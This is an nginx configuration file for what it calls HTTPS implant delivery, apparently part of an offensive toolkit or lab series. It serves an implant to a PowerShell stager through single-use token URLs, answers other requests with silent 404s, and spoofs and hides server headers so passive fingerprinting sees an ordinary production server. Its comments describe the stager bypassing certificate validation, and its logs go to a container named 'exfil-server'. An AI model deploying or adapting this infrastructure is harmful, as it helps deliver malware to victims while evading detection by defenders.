# nginx.conf — Section 9: HTTPS implant delivery + header masking.
#
# Listens on port 443 with TLS (self-signed cert generated by launch.sh).
# PowerShell bypasses cert validation with [Net.ServicePointManager] in
# the stager, so no trusted CA is needed here.
#
# /update/<token>  → proxied to token_server.js on localhost:3000
# Everything else  → 404 (no directory listing, no implicit /implant.exe)
#
# Header masking: Server header reports nginx/1.25.4, not the actual version,
# so passive fingerprinting gives a plausible production server identity.

events {
    worker_connections 64;
}

http {
    # Route nginx logs to Docker stdout/stderr so `docker logs exfil-server` shows them
    access_log /dev/stdout;
    error_log  /dev/stderr warn;

    # Hide version string
    server_tokens off;

    server {
        listen 443 ssl;
        listen [::]:443 ssl;

        # TLS — cert generated by launch.sh with SAN=IP:<HOST_IP>
        ssl_certificate     /etc/nginx/certs/nginx.crt;
        ssl_certificate_key /etc/nginx/certs/nginx.key;

        # TLS 1.2 + 1.3 — PowerShell Net.WebClient on Windows defaults to TLS 1.0/1.1;
        # TLS 1.2 must be allowed so the stager's DownloadFile call succeeds.
        ssl_protocols TLSv1.2 TLSv1.3;
        ssl_prefer_server_ciphers off;

        # Masquerade as a standard production server
        add_header Server "nginx/1.25.4" always;
        add_header X-Content-Type-Options "nosniff" always;
        add_header Cache-Control "no-store" always;

        # Single-use token delivery endpoint
        # nginx passes the path after /update/ to token_server
        location /update/ {
            proxy_pass http://127.0.0.1:3000/;
            proxy_set_header Host $host;
            proxy_set_header X-Real-IP $remote_addr;
            # Suppress upstream identity
            proxy_hide_header X-Powered-By;
        }

        # Reject everything else — no 403, just a silent 404
        location / {
            return 404;
        }
    }
}
